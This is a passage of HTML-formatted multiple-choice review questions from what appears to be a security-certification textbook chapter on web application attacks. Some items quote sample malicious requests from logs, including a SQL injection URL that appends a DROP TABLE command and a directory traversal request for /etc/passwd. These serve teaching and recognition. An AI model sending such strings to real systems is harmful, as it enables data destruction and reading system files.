<li id="c06-ex-0012">Frank is investigating a security incident where the attacker entered a very long string into an input field, which was followed by a system command. What type of attack likely took place?
<ol class="upper-alpha">
<li>Cross-site request forgery</li>
<li>Server-side request forgery</li>
<li>Command injection</li>
<li>Buffer overflow</li>
</ol>
</li>
<li id="c06-ex-0013">What type of attack places an attacker in the position to eavesdrop on communications between a user and a web server?
<ol class="upper-alpha">
<li>On-path attack</li>
<li>Session hijacking</li>
<li>Buffer overflow</li>
<li>Meet-in-the-middle</li>
</ol>
</li>
<li id="c06-ex-0014">Tom is a software developer who creates code for sale to the public. He would like to assure his users that the code they receive actually came from him. What technique can he use to best provide this assurance?
<ol class="upper-alpha">
<li>Code signing</li>
<li>Code endorsement</li>
<li>Code encryption</li>
<li>Code obfuscation</li>
</ol>
</li>
<li id="c06-ex-0015">Chris is reviewing evidence of a cross-site scripting attack where the attacker embedded JavaScript in a URL that a user clicked. The web page then sent the JavaScript to the user in the displayed page. What term best describes this attack?
<ol class="upper-alpha">
<li>Reflected XSS</li>
<li>Stored XSS</li>
<li>Persistent XSS</li>
<li>DOM-based XSS</li>
</ol>
</li>
<li id="c06-ex-0016"><span aria-label="186" epub:type="pagebreak" id="Page_186" role="doc-pagebreak"/> Joe checks his web server logs and sees that someone sent the following query string to an application running on the server:
<pre id="c06-code-0029"><code><a href="http://www.mycompany.com/servicestatus.php?serviceID=892&amp;serviceID=892’%20;DROP%20TABLE%20Services;--">www.mycompany.com/servicestatus.php?serviceID=892&amp;serviceID=892’%20;DROP%20TABLE%20Services;--</a></code>
</pre>
<p class="listPara1" id="c06-para-0318">What type of attack was most likely attempted?</p>
<ol class="upper-alpha">
<li>Cross-site scripting</li>
<li>Session hijacking</li>
<li>Parameter pollution</li>
<li>On-path</li>
</ol>
</li>
<li id="c06-ex-0018">Upon further inspection, Joe finds a series of thousands of requests to the same URL coming from a single IP address. Here are a few examples:
<pre id="c06-code-0030"><code><a href="http://www.mycompany.com/servicestatus.php?serviceID=1">www.mycompany.com/servicestatus.php?serviceID=1</a></code>
<code><a href="http://www.mycompany.com/servicestatus.php?serviceID=2">www.mycompany.com/servicestatus.php?serviceID=2</a></code>
<code><a href="http://www.mycompany.com/servicestatus.php?serviceID=3">www.mycompany.com/servicestatus.php?serviceID=3</a></code>
<code><a href="http://www.mycompany.com/servicestatus.php?serviceID=4">www.mycompany.com/servicestatus.php?serviceID=4</a></code>
<code><a href="http://www.mycompany.com/servicestatus.php?serviceID=5">www.mycompany.com/servicestatus.php?serviceID=5</a></code>
<code><a href="http://www.mycompany.com/servicestatus.php?serviceID=6">www.mycompany.com/servicestatus.php?serviceID=6</a></code>
</pre>
<p class="listPara1" id="c06-para-0331">What type of vulnerability was the attacker likely trying to exploit?</p>
<ol class="upper-alpha">
<li>Insecure direct object reference</li>
<li>File upload</li>
<li>Unvalidated redirect</li>
<li>Session hijacking</li>
</ol>
</li>
<li id="c06-ex-0020">Joe's adventures in web server log analysis are not yet complete. As he continues to review the logs, he finds the request:
<pre id="c06-code-0036"><code><a href="http://www.mycompany.com/../../../etc/passwd">www.mycompany.com/../../../etc/passwd</a></code>
</pre>
<p class="listPara1" id="c06-para-0339">What type of attack was most likely attempted?</p>
<ol class="upper-alpha">
<li>SQL injection</li>
<li>Session hijacking</li>
<li>Directory traversal</li>
<li>File upload</li>
</ol>
</li>
<li id="c06-ex-0022">Wendy is a penetration tester who wishes to engage in a session hijacking attack. What information is crucial for Wendy to obtain if her attack will be successful?
<ol class="upper-alpha">
<li>Session ticket</li>
<li>Session cookie</li>
<li>Username</li>
<li>User password</li>
</ol>
</li>
<li id="c06-ex-0023"><span aria-label="187" epub:type="pagebreak" id="Page_187" role="doc-pagebreak"/>Joe is examining the logs for his web server and discovers that a user sent input to a web application that contained the string <code>WAITFOR</code>. What type of attack was the user likely attempting?
<ol class="upper-alpha">
<li>Timing-based SQL injection</li>
<li>HTML injection</li>
<li>Cross-site scripting</li>
<li>Content-based SQL injection</li>
</ol>
</li>
</ol>
</section>
</section>
</section>
</body>
</html>